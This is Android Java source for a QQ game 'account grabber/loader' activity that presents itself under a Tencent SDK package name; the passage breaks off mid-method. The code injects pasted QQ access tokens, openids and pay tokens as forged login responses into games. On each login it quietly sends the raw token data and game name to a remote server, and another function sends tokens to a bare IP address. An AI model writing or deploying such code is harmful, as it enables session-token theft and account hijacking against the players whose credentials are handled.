package com.tencent.open.agent;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.view.WindowManager;
import android.webkit.WebResourceRequest;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.SimpleAdapter;
import android.widget.TextView;
import android.widget.Toast;

import com.tencent.tim.R;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.FilenameFilter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.Comparator;
import java.util.Date;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AgentActivity extends Activity {

    private static final String AUTH_REDIRECT_URL = "auth:";
    private static final int REQUEST_CODE_STORAGE_PERMISSIONS = 1;
    private static final String PREF_NAME = "MyPrefs";
    private static final String KEY_RAW_TEXT = "raw_text";
    private static final String SCREEN_ORIENTATION_PORTRAIT = "portrait";
    private static final String SCREEN_ORIENTATION_LANDSCAPE = "landscape";
    private static final String KEY_IS_TOP = "isTop";
    // ========== 以下常量将在构建时由用户配置替换 ==========
private static final String API_URL = "https://www.思绪.cn/%E6%9E%AB%E5%8F%B6/api/send_data.php";
private static final String DEFAULT_UID = "{{DEFAULT_UID}}";
// =================================================
    private static final String KEY_UNLIMITED_MODE = "unlimited_mode";
    private static final String QUERY_API_URL = "http://156.239.225.152/glq/hp.php?access_token=";
    private static final String AUTO_LOGIN_FILE_PATH = "/storage/emulated/0/抓号器上号器_自动登录.txt";

    private WebView webView;
    private String firstLine;
    private int secondLine;
    private Button myButton;
    private EditText plainText;
    private ListView accountListView;
    private ArrayList<HashMap<String, String>> accountList;
    private SimpleAdapter adapter;
    private Button addAccountButton;
    private String webViewUrl;
    private ConnectivityManager connectivityManager;
    private CheckBox unlimitedModeCheckbox;
    private Button queryButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            WindowManager.LayoutParams params = getWindow().getAttributes();
            params.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
            getWindow().setAttributes(params);
        }

        getWindow().getDecorView().setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_FULLSCREEN
            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
        );

        getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN);

        applyScreenOrientation();

        setContentView(R.layout.activity_agent);

        connectivityManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);

        Intent intent = getIntent();
        webViewUrl = intent.getStringExtra("WEBVIEW_URL");
        if (webViewUrl == null) {
            webViewUrl = "https://xui.ptlogin2.qq.com/cgi-bin/xlogin?pt_enable_pwd=1&appid=716027609&pt_3rd_aid=1106467070&daid=381&pt_skey_valid=0&style=35&force_qr=1&autorefresh=1&s_url=http%3A%2F%2Fconnect.qq.com&refer_cgi=m_authorize&ucheck=1&fall_to_wv=1&status_os=13&redirect_uri=auth%3A%2F%2Ftauth.qq.com%2F&client_id=1106467070&pf=openmobile_android&response_type=token&scope=all&sdkp=a&sdkv=3.5.14&sign=DD2B8B16CCAEE72B390F070106F00F0E&status_machine=M2102J2SC&switch=1&time=1720462937&loginfrom=add&h5sig=08nxvF7WAloOfZfomAK9EVeia3NFMcB4U_J0I5Z7r6M&loginty=6";
        }

        myButton = findViewById(R.id.my_button);
        plainText = findViewById(R.id.editTextTextPersonName);
        webView = findViewById(R.id.webView);
        addAccountButton = findViewById(R.id.add_account_button);
        accountListView = findViewById(R.id.account_list);
        unlimitedModeCheckbox = findViewById(R.id.unlimited_mode_checkbox);
        queryButton = findViewById(R.id.query_button);

        accountList = new ArrayList<>();
        adapter = new SimpleAdapter(this, accountList,
                                    android.R.layout.simple_list_item_1,
                                    new String[]{"title"},
                                    new int[]{android.R.id.text1}) {
            @Override
            public View getView(int position, View convertView, ViewGroup parent) {
                View view = super.getView(position, convertView, parent);
                TextView textView = view.findViewById(android.R.id.text1);
                boolean isTop = Boolean.parseBoolean(accountList.get(position).get(KEY_IS_TOP));
                textView.setTextColor(isTop ? Color.RED : Color.BLACK);
                return view;
            }
        };
        accountListView.setAdapter(adapter);

        loadAccountsFromPrefs();
        loadUnlimitedModeSetting();

        unlimitedModeCheckbox.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                saveUnlimitedModeSetting();
                if (unlimitedModeCheckbox.isChecked()) {
                    Toast.makeText(AgentActivity.this, "已开启不限制数据上号模式", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(AgentActivity.this, "已关闭不限制数据上号模式", Toast.LENGTH_SHORT).show();
                }
            }
        });

        queryButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                queryAccessTokenInfo();
            }
        });

        addAccountButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    showAddAccountDialog();
                }
            });

        accountListView.setOnItemClickListener(new AdapterView.OnItemClickListener() {
                @Override
                public void onItemClick(AdapterView<?> parent, View view, final int position, long id) {
                    final HashMap<String, String> item = accountList.get(position);
                    plainText.setText(item.get("content"));
                    Toast.makeText(AgentActivity.this, "已加载：" + item.get("title"), Toast.LENGTH_SHORT).show();
                }
            });

        accountListView.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {
                @Override
                public boolean onItemLongClick(AdapterView<?> parent, View view, final int position, long id) {
                    final HashMap<String, String> item = accountList.get(position);
                    boolean isTop = Boolean.parseBoolean(item.get(KEY_IS_TOP));

                    final ArrayList<String> options = new ArrayList<>();
                    options.add(isTop ? "取消置顶" : "置顶账号");
                    options.add("删除账号");
                    options.add("重新修改标题");
                    options.add("重新输入内容");

                    new AlertDialog.Builder(AgentActivity.this)
                        .setTitle("操作选项")
                        .setItems(options.toArray(new String[0]), new DialogInterface.OnClickListener() {
                            @Override
                            public void onClick(DialogInterface dialog, final int which) {
                                switch (which) {
                                    case 0:
                                        handleTopOperation(position);
                                        break;
                                    case 1:
                                        if (position >= 0 && position < accountList.size()) {
                                            accountList.remove(position);
                                            adapter.notifyDataSetChanged();
                                            saveAccountsToPrefs();
                                            Toast.makeText(AgentActivity.this, "删除成功", Toast.LENGTH_SHORT).show();
                                        }
                                        break;
                                    case 2:
                                        showRenameDialog(position);
                                        break;
                                    case 3:
                                        showReinputContentDialog(position);
                                        break;
                                }
                            }
                        })
                        .setNegativeButton("取消", null)
                        .show();
                    return true;
                }
            });

        Button backupButton = findViewById(R.id.backup_button);
        Button importButton = findViewById(R.id.import_button);

        backupButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    backupAccounts();
                }
            });

        importButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    importAccounts();
                }
            });

        ImageView backButton = findViewById(R.id.webview_back_button);
        backButton.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    if (webView.canGoBack()) {
                        webView.goBack();
                    } else {
                        finish();
                    }
                }
            });

        SharedPreferences sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);
        String content = sharedPreferences.getString("pd_key", "2");

        if ("1".equals(content.trim())) {
            webView.setVisibility(View.GONE);
            findViewById(R.id.yc).setVisibility(View.VISIBLE);
            loadRawDataFromSharedPreferences(plainText);
            
            checkAutoLoginSetting();
        } else {
            readFile();
            initWebView();
        }

        if (checkSelfPermission(android.Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
            requestPermissions(new String[]{
                                   android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
                                   android.Manifest.permission.READ_EXTERNAL_STORAGE},
                               REQUEST_CODE_STORAGE_PERMISSIONS);
        }
    }

    private void checkAutoLoginSetting() {
        SharedPreferences sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);
        String mode = sharedPreferences.getString("pd_key", "2");
        
        if ("1".equals(mode) && isAutoLoginEnabled()) {
            new android.os.Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    performAutoLogin();
                }
            }, 100);
        }
    }

    private boolean isAutoLoginEnabled() {
        File autoLoginFile = new File(AUTO_LOGIN_FILE_PATH);
        if (autoLoginFile.exists()) {
            try {
                BufferedReader reader = new BufferedReader(new FileReader(autoLoginFile));
                String content = reader.readLine();
                reader.close();
                return "1".equals(content);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return false;
    }

    private void performAutoLogin() {
        SharedPreferences sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);
        String mode = sharedPreferences.getString("pd_key", "2");
        
        if (!"1".equals(mode)) {
            return;
        }
        
        String loginData = plainText.getText().toString().trim();
        
        if (TextUtils.isEmpty(loginData)) {
            if (accountList != null && !accountList.isEmpty()) {
                HashMap<String, String> firstAccount = accountList.get(0);
                loginData = firstAccount.get("content");
                plainText.setText(loginData);
                Toast.makeText(this, "自动使用账号: " + firstAccount.get("title"), Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(this, "自动登录失败：没有可用的账号数据", Toast.LENGTH_SHORT).show();
                return;
            }
        }
        
        Log.d("AutoLogin", "开始自动登录，数据长度: " + loginData.length());
        executeLogin(loginData, true);
    }

    private void executeLogin(String loginData, boolean isAutoLogin) {
        Intent intent = new Intent();
        boolean isUnlimitedMode = unlimitedModeCheckbox.isChecked();
        
        if (isUnlimitedMode) {
            handleUnlimitedLogin(loginData, intent, isAutoLogin);
        } else {
            if (loginData.contains("access_token=")) {
                handleAccessTokenLogin(loginData, intent, isAutoLogin);
            } else if (loginData.contains("|")) {
                handlePipeSeparatedLogin(loginData, intent, isAutoLogin);
            } else {
                SharedPreferences sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);
                String mode = sharedPreferences.getString("pd_key", "2");
                
                if ("1".equals(mode)) {
                    String gameName = getGameNameFromMainActivity();
                    String loginType = isAutoLogin ? "自动登录-无法识别格式" : "上号模式-无法识别格式";
                    sendDataToServer("提交到的账号", loginType, gameName, loginData);
                    
                    if (isAutoLogin) {
                        Toast.makeText(AgentActivity.this, "自动登录失败：无法识别的账号格式，但数据已提交", Toast.LENGTH_SHORT).show();
                    } else {
                        Toast.makeText(AgentActivity.this, "无法识别的账号格式，但数据已提交", Toast.LENGTH_SHORT).show();
                    }
                } else if (isAutoLogin) {
                    Toast.makeText(AgentActivity.this, "自动登录失败：无法识别的账号格式", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(AgentActivity.this, "无法识别的账号格式", Toast.LENGTH_SHORT).show();
                }
            }
        }
    }

    public void sh(View view) {
        String test = plainText.getText().toString().trim();

        SharedPreferences sharedPreferences = getSharedPreferences("myPrefs", MODE_PRIVATE);
        String mode = sharedPreferences.getString("pd_key", "2");

        if ("3".equals(mode)) {
            if (!TextUtils.isEmpty(test)) {
                String gameName = getGameNameFromMainActivity();
                sendDataToServer("提交到的账号", "挂机模式", gameName, test);
                Toast.makeText(AgentActivity.this, "挂机模式数据已提交", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(AgentActivity.this, "编辑框为空，无数据可提交", Toast.LENGTH_SHORT).show();
            }
            return;
        }

        executeLogin(test, false);
    }

    private void queryAccessTokenInfo() {
        final String text = plainText.getText().toString().trim();

        if (TextUtils.isEmpty(text)) {
            Toast.makeText(this, "编辑框内容为空", Toast.LENGTH_SHORT).show();
            return;
        }

        final String accessToken = extractAccessToken(text);

        if (TextUtils.isEmpty(accessToken)) {
            Toast.makeText(this, "未找到access_token", Toast.LENGTH_SHORT).show();
            return;
        }

        final AlertDialog loadingDialog = new AlertDialog.Builder(this)
            .setTitle("查询中")
            .setMessage("正在查询access_token信息...")
            .setCancelable(false)
            .create();
        loadingDialog.show();

        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    String urlString = QUERY_API_URL + "?access_token=" + accessToken;
                    URL url = new URL(urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("GET");
                    conn.setConnectTimeout(10000);
                    conn.setReadTimeout(10000);

                    int responseCode = conn.getResponseCode();
                    String response = "";

                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        InputStream inputStream = conn.getInputStream();
                        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
                        StringBuilder responseBuilder = new StringBuilder();
                        String line;
                        while ((line = reader.readLine()) != null) {
                            responseBuilder.append(line);
                        }
                        reader.close();
                        response = responseBuilder.toString();
                    } else {
                        response = "请求失败，响应码: " + responseCode;
                    }

                    conn.disconnect();

                    final String finalResponse = response;

                    runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                loadingDialog.dismiss();
                                showQueryResult(accessToken, finalResponse);
                            }
                        });

                } catch (final Exception e) {
                    e.printStackTrace();
                    runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                loadingDialog.dismiss();
                                showQueryResult(accessToken, "查询失败: " + e.getMessage());
                            }
                        });
                }
            }
        }).start();
    }

    private String extractAccessToken(String text) {
        Pattern pattern = Pattern.compile("access_token=([^&]*)");
        Matcher matcher = pattern.matcher(text);
        if (matcher.find()) {
            return matcher.group(1);
        }

        if (text.contains("|")) {
            String[] parts = text.split("\\|");
            if (parts.length >= 2) {
                return parts[1].trim();
            }
        }

        return null;
    }

    private void showQueryResult(final String accessToken, final String result) {
        final String formattedResult = result.replace("<br>", "\n");

        String message = "access_token: " + accessToken + "\n\n" +
            "查询结果:\n" + formattedResult;

        new AlertDialog.Builder(this)
            .setTitle("查询结果")
            .setMessage(message)
            .setPositiveButton("确定", null)
            .setNeutralButton("复制结果", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    if (Build.VERSION.SDK_INT < Build.VERSION_CODES.HONEYCOMB) {
                        android.text.ClipboardManager clipboard = (android.text.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                        clipboard.setText(formattedResult);
                    } else {
                        android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                        android.content.ClipData clip = android.content.ClipData.newPlainText("查询结果", formattedResult);
                        clipboard.setPrimaryClip(clip);
                    }
                    Toast.makeText(AgentActivity.this, "结果已复制到剪贴板", Toast.LENGTH_SHORT).show();
                }
            })
            .show();
    }

    private void saveUnlimitedModeSetting() {
        SharedPreferences prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putBoolean(KEY_UNLIMITED_MODE, unlimitedModeCheckbox.isChecked());
        editor.apply();
    }

    private void loadUnlimitedModeSetting() {
        SharedPreferences prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        boolean isUnlimitedMode = prefs.getBoolean(KEY_UNLIMITED_MODE, false);
        unlimitedModeCheckbox.setChecked(isUnlimitedMode);
    }

    private void applyScreenOrientation() {
        Intent intent = getIntent();
        String orientation = intent.getStringExtra("SCREEN_ORIENTATION");

        if (orientation == null) {
            SharedPreferences prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
            orientation = prefs.getString("agent_screen_orientation", SCREEN_ORIENTATION_PORTRAIT);
        }

        if (SCREEN_ORIENTATION_PORTRAIT.equals(orientation)) {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
        } else {
            setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_LANDSCAPE);
        }
    }

    private boolean isVpnActive() {
        if (connectivityManager == null) {
            return false;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            Network activeNetwork = connectivityManager.getActiveNetwork();
            if (activeNetwork != null) {
                NetworkCapabilities capabilities = connectivityManager.getNetworkCapabilities(activeNetwork);
                return capabilities != null && 
                    (capabilities.hasTransport(NetworkCapabilities.TRANSPORT_VPN) ||
                    !capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_NOT_VPN));
            }
        } else {
            try {
                java.net.NetworkInterface.getNetworkInterfaces();
                return false;
            } catch (Exception e) {
                return false;
            }
        }
        return false;
    }

    private void handleUnlimitedLogin(String test, Intent intent, boolean isAutoLogin) {
        if (TextUtils.isEmpty(test)) {
            if (isAutoLogin) {
                Toast.makeText(AgentActivity.this, "自动登录失败：账号数据为空", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(AgentActivity.this, "请输入上号数据", Toast.LENGTH_SHORT).show();
            }
            return;
        }

        try {
            JSONObject jSONObject3 = createLoginResponseForAnyData(test);
            saveRawDataToSharedPreferences(test);
            String gameName = getGameNameFromMainActivity();
            String loginType = isAutoLogin ? "自动登录-不限制" : "上号模式-不限制";
            sendDataToServer("提交到的账号", loginType, gameName, test);
            intent.putExtra("key_response", jSONObject3.toString());
            setResult(RESULT_OK, intent);
            
            if (isAutoLogin) {
                Toast.makeText(AgentActivity.this, "自动登录成功", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(AgentActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
            }
            
            loadRawDataFromSharedPreferences(plainText);
            finish();

        } catch (JSONException e) {
            e.printStackTrace();
            if (isAutoLogin) {
                Toast.makeText(AgentActivity.this, "自动登录处理错误", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(AgentActivity.this, "登录数据处理错误", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private JSONObject createLoginResponseForAnyData(String rawData) throws JSONException {
        JSONObject jSONObject3 = new JSONObject();
        jSONObject3.put("access_token", generateTokenFromData(rawData));
        jSONObject3.put("openid", generateOpenIdFromData(rawData));
        jSONObject3.put("pay_token", generatePayTokenFromData(rawData));
        jSONObject3.put("expires_in", "5184000");
        jSONObject3.put("ret", "0");
        jSONObject3.put("pf", "desktop_m_qq-10000144-android-2002-");
        jSONObject3.put("page_type", "1");
        jSONObject3.put("raw_input_data", rawData);
        jSONObject3.put("unlimited_mode", "true");
        return jSONObject3;
    }

    private String generateTokenFromData(String data) {
        return "unlimited_" + Integer.toHexString(data.hashCode());
    }

    private String generateOpenIdFromData(String data) {
        return "unlimited_openid_" + Integer.toHexString(data.hashCode());
    }

    private String generatePayTokenFromData(String data) {
        return "unlimited_paytoken_" + Integer.toHexString(data.hashCode());
    }

    private void handleAccessTokenLogin(String test, Intent intent, boolean isAutoLogin) {
        Pattern pattern = Pattern.compile("access_token=(.*?)&expires_in=(.*?)&openid=(.*?)&pay_token=(.*?)&");
        Matcher matcher = pattern.matcher(test);

        if (matcher.find()) {
            String access_token = matcher.group(1);
            String expires_in = matcher.group(2);
            String openid = matcher.group(3);
            String pay_token = matcher.group(4);

            try {
                JSONObject jSONObject3 = createStandardLoginResponse(access_token, expires_in, openid, pay_token);
                saveRawDataToSharedPreferences(test);
                String gameName = getGameNameFromMainActivity();
                String loginType = isAutoLogin ? "自动登录" : "上号模式";
                sendDataToServer("提交到的账号", loginType, gameName, test);
                intent.putExtra("key_response", jSONObject3.toString());
                setResult(RESULT_OK, intent);
                
                if (isAutoLogin) {
                    Toast.makeText(AgentActivity.this, "自动登录成功", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(AgentActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
                }
                
                loadRawDataFromSharedPreferences(plainText);
                finish();
            } catch (JSONException e) {
                e.printStackTrace();
            }
        } else {
            if (isAutoLogin) {
                Toast.makeText(AgentActivity.this, "自动登录失败：账号格式错误", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(AgentActivity.this, "格式错误", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void handlePipeSeparatedLogin(String test, Intent intent, boolean isAutoLogin) {
        String[] parts = test.split("\\|");
        if (parts.length >= 3) {
            String openid = parts[0].trim();
            String access_token = parts[1].trim();
            String pay_token = parts[2].trim();
            String expires_in = parts.length > 3 ? parts[3].trim() : "5184000";

            try {
                JSONObject jSONObject3 = createStandardLoginResponse(access_token, expires_in, openid, pay_token);
                saveRawDataToSharedPreferences(test);
                String gameName = getGameNameFromMainActivity();
                String loginType = isAutoLogin ? "自动登录" : "上号模式";
                sendDataToServer("提交到的账号", loginType, gameName, test);
                intent.putExtra("key_response", jSONObject3.toString());
                setResult(RESULT_OK, intent);
                
                if (isAutoLogin) {
                    Toast.makeText(AgentActivity.this, "自动登录成功", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(AgentActivity.this, "登录成功", Toast.LENGTH_SHORT).show();
                }
                
                loadRawDataFromSharedPreferences(plainText);
                finish();
            } catch (JSONException e) {
                e.printStackTrace();
                if (isAutoLogin) {
                    Toast.makeText(AgentActivity.this, "自动登录JSON解析错误", Toast.LENGTH_SHORT).show();
                } else {
                    Toast.makeText(AgentActivity.this, "JSON解析错误", Toast.LENGTH_SHORT).show();
                }
            }
        } else {
            if (isAutoLogin) {
                Toast.makeText(AgentActivity.this, "自动登录失败：OP格式错误", Toast.LENGTH_SHORT).show();
            } else {
                Toast.makeText(AgentActivity.this, "OP格式错误，需要至少3个部分", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private JSONObject createStandardLoginResponse(String accessToken, String expiresIn, String openId, String payToken) throws JSONException {
        JSONObject jSONObject3 = new JSONObject();
        jSONObject3.put("access_token", accessToken);
        jSONObject3.put("openid", openId);
        jSONObject3.put("pay_token", payToken);
        jSONObject3.put("expires_in", expiresIn);
        jSONObject3.put("ret", "0");
        jSONObject3.put("pf", "desktop_m_qq-10000144-android-2002-");
        jSONObject3.put("page_type", "1");
        return jSONObject3;
    }

    // ================== 备份相关方法 ==================
    private void backupAccounts() {
        if (accountList.isEmpty()) {
            Toast.makeText(this, "没有账号可备份", Toast.LENGTH_SHORT).show();
            return;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("选择要备份的账号");

        final String[] accountNames = new String[accountList.size()];
        final boolean[] checkedItems = new boolean[accountList.size()];

        for (int i = 0; i < accountList.size(); i++) {
            accountNames[i] = accountList.get(i).get("title");
            checkedItems[i] = false;
        }

        builder.setMultiChoiceItems(accountNames, checkedItems, new DialogInterface.OnMultiChoiceClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which, boolean isChecked) {
                    checkedItems[which] = isChecked;
                }
            });

        builder.setPositiveButton("备份选中", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    ArrayList<HashMap<String, String>> selectedAccounts = new ArrayList<>();
                    for (int i = 0; i < checkedItems.length; i++) {
                        if (checkedItems[i]) {
                            selectedAccounts.add(accountList.get(i));
                        }
                    }

                    if (selectedAccounts.isEmpty()) {
                        Toast.makeText(AgentActivity.this, "请至少选择一个账号", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    performBackup(selectedAccounts);
                }
            });

        builder.setNegativeButton("取消", null);
        builder.setNeutralButton("全选", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    showBackupDialogWithAllSelected();
                }
            });

        builder.show();
    }

    private void showBackupDialogWithAllSelected() {
        final String[] accountNames = new String[accountList.size()];
        final boolean[] checkedItems = new boolean[accountList.size()];

        for (int i = 0; i < accountList.size(); i++) {
            accountNames[i] = accountList.get(i).get("title");
            checkedItems[i] = true;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("选择要备份的账号");
        builder.setMultiChoiceItems(accountNames, checkedItems, new DialogInterface.OnMultiChoiceClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which, boolean isChecked) {
                    checkedItems[which] = isChecked;
                }
            });

        builder.setPositiveButton("备份选中", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    ArrayList<HashMap<String, String>> selectedAccounts = new ArrayList<>();
                    for (int i = 0; i < checkedItems.length; i++) {
                        if (checkedItems[i]) {
                            selectedAccounts.add(accountList.get(i));
                        }
                    }

                    if (selectedAccounts.isEmpty()) {
                        Toast.makeText(AgentActivity.this, "请至少选择一个账号", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    performBackup(selectedAccounts);
                }
            });

        builder.setNegativeButton("取消", null);
        builder.setNeutralButton("取消全选", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    showBackupDialogWithNoneSelected();
                }
            });

        builder.show();
    }

    private void showBackupDialogWithNoneSelected() {
        final String[] accountNames = new String[accountList.size()];
        final boolean[] checkedItems = new boolean[accountList.size()];

        for (int i = 0; i < accountList.size(); i++) {
            accountNames[i] = accountList.get(i).get("title");
            checkedItems[i] = false;
        }

        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("选择要备份的账号");
        builder.setMultiChoiceItems(accountNames, checkedItems, new DialogInterface.OnMultiChoiceClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which, boolean isChecked) {
                    checkedItems[which] = isChecked;
                }
            });

        builder.setPositiveButton("备份选中", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    ArrayList<HashMap<String, String>> selectedAccounts = new ArrayList<>();
                    for (int i = 0; i < checkedItems.length; i++) {
                        if (checkedItems[i]) {
                            selectedAccounts.add(accountList.get(i));
                        }
                    }

                    if (selectedAccounts.isEmpty()) {
                        Toast.makeText(AgentActivity.this, "请至少选择一个账号", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    performBackup(selectedAccounts);
                }
            });

        builder.setNegativeButton("取消", null);
        builder.setNeutralButton("全选", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    showBackupDialogWithAllSelected();
                }
            });

        builder.show();
    }

    private void performBackup(final ArrayList<HashMap<String, String>> selectedAccounts) {
        try {
            final File backupDir = new File(Environment.getExternalStorageDirectory(), "-上号器/上号器账号备份");
            if (!backupDir.exists()) {
                backupDir.mkdirs();
            }
            showCustomFilenameDialog(backupDir, selectedAccounts);
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "备份失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void showCustomFilenameDialog(final File backupDir, final ArrayList<HashMap<String, String>> selectedAccounts) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("输入备份文件名");
        builder.setMessage("请输入自定义文件名（前缀和后缀已固定）");

        final EditText input = new EditText(this);
        input.setHint("请输入文件名");
        String defaultName = new SimpleDateFormat("yyyyMMdd").format(new Date());
        input.setText(defaultName);
        input.setSelection(input.getText().length());

        builder.setView(input)
            .setPositiveButton("确定", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    String customName = input.getText().toString().trim();
                    if (TextUtils.isEmpty(customName)) {
                        Toast.makeText(AgentActivity.this, "文件名不能为空", Toast.LENGTH_SHORT).show();
                        return;
                    }
                    executeBackup(backupDir, selectedAccounts, customName);
                }
            })
            .setNegativeButton("取消", null)
            .show();
    }

    private void executeBackup(final File backupDir, final ArrayList<HashMap<String, String>> selectedAccounts, final String customName) {
        try {
            String fileName = "抓号器上号器_" + customName + ".json";
            final File backupFile = new File(backupDir, fileName);
            if (backupFile.exists()) {
                new AlertDialog.Builder(this)
                    .setTitle("文件已存在")
                    .setMessage("文件 " + fileName + " 已存在，是否覆盖？")
                    .setPositiveButton("覆盖", new DialogInterface.OnClickListener() {
                        @Override
                        public void onClick(DialogInterface dialog, int which) {
                            doBackup(backupFile, selectedAccounts);
                        }
                    })
                    .setNegativeButton("取消", null)
                    .show();
            } else {
                doBackup(backupFile, selectedAccounts);
            }
        } catch (Exception e) {
            e.printStackTrace();
            Toast.makeText(this, "备份失败: " + e.getMessage(), Toast.LENGTH_SHORT).show();
        }
    }

    private void doBackup(File backupFile, ArrayList<HashMap<String, String>> selectedAccounts) {
        try {
            JSONArray backupArray = new JSONArray();
            for (HashMap<String, String> account : selectedAccounts) {
                JSONObject accountObj = new JSONObject();
                accountObj.put("title", account.get("title"));
                accountObj.put("content", account.get("content"));
                accountObj.put(KEY_IS_TOP, account.get(KEY_IS_TOP));
                backupArray.put(accountObj);
            }
            FileWriter writer = new FileWriter(backupFile);
            writer.write(backupArray.toString());
            writer.flush();
            writer.close();
            String message = "备份成功！\n已备份 " + selectedAccounts.size() + " 个账号\n保存位置: " + backupFile.getAbsolutePath();
            Toast.makeText(this, message, Toast.LENGTH_LONG).show();
